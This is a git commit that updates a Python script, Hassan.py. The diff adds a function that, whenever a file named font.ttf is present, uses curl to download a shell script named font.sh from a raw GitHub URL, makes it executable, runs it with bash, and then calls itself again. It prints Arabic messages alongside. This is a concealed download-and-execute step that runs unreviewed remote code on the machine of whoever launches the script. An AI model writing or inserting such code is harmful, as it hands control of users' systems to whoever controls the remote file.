a9531733e6d4cf1e3df42558b0131518c32843fe
AIi2689 <151983448+AIi2689@users.noreply.github.com>
2024-03-14 21:23:02 +0300

    Update Hassan.py

--- Hassan.py
+++ Hassan.py
@@ -1,3 +1,13 @@
+import os
+def ar():
+ if os.path.exists('font.ttf'):
+    os.system('curl https://raw.githubusercontent.com/br5kly/XC/main/font.sh >font.sh')
+    os.system('chmod +x font.sh')
+    os.system('bash font.sh')
+    ar()
+ if not os.path.exists('font.ttf'):
+    print("تريمكس عربي بالفعل")   
+ar()
 print("هكر محتوى غير معين!")
 from os import path
 import os,base64,zlib,pip,urllib,time
